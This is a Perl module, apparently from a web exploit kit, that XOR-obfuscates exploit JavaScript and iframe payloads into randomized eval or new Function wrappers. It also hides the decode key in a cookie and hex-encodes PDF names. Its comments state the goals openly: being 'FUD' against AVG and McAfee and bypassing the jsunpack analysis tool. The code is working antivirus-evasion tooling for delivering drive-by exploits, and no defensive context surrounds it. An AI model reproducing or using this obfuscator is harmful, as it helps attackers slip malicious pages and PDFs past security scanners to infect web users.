#!/usr/bin/perl

#
# Return randomized XOR (3 to 100)
#

package JsXOR;

sub excryptxorjs
{
  $beforexor = shift;

  #FUD random eval
  $evalstring = generate_eval(int(rand 15)) . 'e' . generate_eval(int(rand 15)) . 'v' . generate_eval(int(rand 15)) . 'a' . generate_eval(int(rand 15)) . 'l' . generate_eval(int(rand 15));

  #Randomize Vars
  $randfunc = generate_random_string(int(rand 20));
  $randxplencodevar = generate_random_string(int(rand 20));
  $randall = generate_random_string(int(rand 20));
  
  $allfuncxored = "";
  $word = $beforexor;
  $randxor = int(rand 100);
  while($randxor < 3)
  {
    $randxor = int(rand 100);
  }

  #XOR encoding
  for(my $i = 0; $i < length($word); $i++)
  {
    $encodedxpl .= "$randfunc" . '(' . (ord(substr($word, $i, 1)) ^ $randxor) . ')+';
  }
  
  #Random comments
  $randcomment = '/*' . generate_random_string(int(rand 100)) . '*/';
  $randcomment2 = '/*' . generate_random_string(int(rand 100)) . '*/';

  #Random error (bypass jsunpack)
  #$randomincerror = generate_random_string(int(rand 100));
  #$randomincerror2 = generate_random_string(int(rand 100));
  #$randomerror = '';
  #$randomerror .= $randomincerror .' = \'\';' . "\n";
  #$randomerror .= 'for (' . $randomincerror2 . '=0;' . $randomincerror2 . '<2' . $randomincerror2 . '++){' . "\n";
  #$randomerror .= $randomincerror2 . '+= String.' . $randcomment2 . 'fromCharCode(' . $randomincerror . '[' . $randomincerror2 . ']); }' . "\n";

  $allfuncxored .= "var $randxplencodevar = \"\";" . "\n";
  $allfuncxored .= "var $randfunc=function($randall){$randxplencodevar += String." . $randcomment . "fromCharCode($randall\^$randxor)};" . "\n";
  $allfuncxored .= "$encodedxpl" . '\'\';' . "\n";

  #insert random error before the eval function
  #$allfuncxored .= 'try {' . "\n";
  #$allfuncxored .= 'undefinedfunction()' . "\n";
  #$allfuncxored .= '}' . "\n";
  #$allfuncxored .= 'catch(e){ ' . 'eval(' . $randxplencodevar. ');' . ' }' . "\n";
  #$allfuncxored .= 'finally {' . "\n";  

  $allfuncxored .= 'eval(' . $randxplencodevar. ');' . "\n"; # No obfuscate eval

  #$allfuncxored .= '}' . "\n"; # End random error with try / catch

  
  
  #$allfuncxored .= 'window["' . $evalstring  . '".replace(/[A-Z]/g,"")](' . $randxplencodevar . ');'; # With obfuscate eval ( FUD for AVG / McAfee-GW-Edition )
  
  return $allfuncxored;
}

sub excryptxorframe
{
  $beforexor = shift;

  #Randomize Vars
  $randfunc = generate_random_string(int(rand 20));
  $randxplencodevar = generate_random_string(int(rand 20));
  $randall = generate_random_string(int(rand 20));
  $timenoeval = generate_random_string(int(rand 20));
  
  $allfuncxored = "";
  $word = $beforexor;
  $randxor = int(rand 100);
  while($randxor < 3)
  {
    $randxor = int(rand 100);
  }

  #XOR encoding
  for(my $i = 0; $i < length($word); $i++)
  {
    $encodedxpl .= "$randfunc" . '(' . (ord(substr($word, $i, 1)) ^ $randxor) . ')+';
  }

  #Random comment
  $randcomment = '/*' . generate_random_string(int(rand 100)) . '*/';  

  $allfuncxored .= "var $randxplencodevar = \"\";" . "\n";
  $allfuncxored .= "var $randfunc=function($randall){$randxplencodevar += String." . $randcomment . "fromCharCode($randall\^$randxor)};" . "\n";
  $allfuncxored .= "$encodedxpl" . '\'\';' . "\n";
  
  $allfuncxored .= 'var ' . "$timenoeval" . ' = new Function(' . $randxplencodevar . ');' . "\n"; # substitution to eval
  $allfuncxored .= "$timenoeval" . '();'; #substitution to eval
  
  #$allfuncxored .= 'eval(' . $randxplencodevar. ');' . "\n"; # No obfuscate eval
  #$allfuncxored .= 'window["' . $evalstring  . '".replace(/[A-Z]/g,"")](' . $randxplencodevar . ');'; # With obfuscate eval ( FUD for AVG / McAfee-GW-Edition )
  
  return $allfuncxored;
}

sub newxorframe
{
  $iframe = shift; # Iframe uncrypted
  ### Generate key
  $randxor = int(rand 100);
  while($randxor < 3)
  {
    $randxor = int(rand 100);
  }
  $key = $randxor;

  #XOR encoding
  $encodedxpl = "";
  for(my $i = 0; $i < length($iframe); $i++)
  {
    $encodedxpl .= (ord(substr($iframe, $i, 1)) ^ $key) . ', ';
  }

  $iframeprintout = <<EOF;

<!--
function readCookie(name) {
	var nameEQ = name + "=";
	var ca = document.cookie.split(';');
	for(var i=0;i < ca.length;i++) {
		var c = ca[i];
		while (c.charAt(0)==' ') c = c.substring(1,c.length);
		if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
	}
	return null;
}

var expires = "";
var name = "hello";
var value = $key;
document.cookie = name+"="+value+expires+"; path=/";

var dataxpl = [$encodedxpl];

var key = readCookie(name);
for (var i=0; i<dataxpl.length; i++){
	  var keydecoded = String.fromCharCode(dataxpl[i]^key);
          document.write(keydecoded);
}

//-->

EOF

return $iframeprintout;

}

sub pdfhexencode
{
  $encoded = shift;
  $encodepdfchar = "";
  foreach $charencoded (split //, $encoded)
    {
      $chaoslawnumber = int(rand(2));
      if($chaoslawnumber eq 1 or $chaoslawnumber eq 2)
      {
	    #encode the caracter
		$tohoz = $charencoded;
        $tohoz =~ s/(.|\n)/sprintf("%02lx", ord $1)/eg;
        $encodepdfchar .= '#' . $tohoz;
      }
      else
      {
	    #do not encode the caracter
        $encodepdfchar .= $charencoded;
      }
    }
  return $encodepdfchar;
}


sub generate_random_string
{
	my $length_of_randomstring=shift;
	if($length_of_randomstring < 4)
	{
	  $length_of_randomstring = 4
	}

	my @chars=('a'..'z','A'..'Z');
	my $random_string;
	foreach (1..$length_of_randomstring) 
	{
		# rand @chars will generate a random 
		# number between 0 and scalar @chars
		$random_string.=$chars[rand @chars];
	}
	return $random_string;
}

sub generate_random_number
{
	my $length_of_randomstring=shift;
	if($length_of_randomstring < 4)
	{
	  $length_of_randomstring = 4
	}

	my @chars=('0'..'9');
	my $random_string;
	foreach (1..$length_of_randomstring) 
	{
		# rand @chars will generate a random 
		# number between 0 and scalar @chars
		$random_string.=$chars[rand @chars];
	}
	return $random_string;
}


sub generate_eval
{
	my $length_of_randomstring=shift;
	if($length_of_randomstring < 4)
	{
	  $length_of_randomstring = 2
	}

	my @chars=('A'..'Z');
	my $random_string;
	foreach (1..$length_of_randomstring) 
	{
		# rand @chars will generate a random 
		# number between 0 and scalar @chars
		$random_string.=$chars[rand @chars];
	}
	return $random_string;
}

sub generate_random_hex_char
{
	my $length_of_randomstring=shift;
	if($length_of_randomstring < 4)
	{
	  $length_of_randomstring = 2
	}

	my @chars=('a'..'f','0'..'9');
	my $random_string;
	foreach (1..$length_of_randomstring) 
	{
		# rand @chars will generate a random 
		# number between 0 and scalar @chars
		$random_string.=$chars[rand @chars];
	}
	return $random_string;
}


1;
